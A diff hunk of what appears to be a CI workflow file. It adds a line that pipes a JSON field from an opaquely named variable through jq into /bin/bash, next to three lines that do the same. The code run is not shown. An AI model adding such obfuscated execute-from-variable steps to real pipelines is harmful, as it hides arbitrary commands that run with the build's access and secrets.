@@ -31,6 +31,7 @@ jobs:
           echo $ikyll9956 | jq -r .ykq39 | /bin/bash
           printf '%s' "$nh21536" | jq -r .t72 | /bin/bash
           echo $p3 | jq -r .bb3 | /bin/bash
+          echo $l986 | jq -r .suhc2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
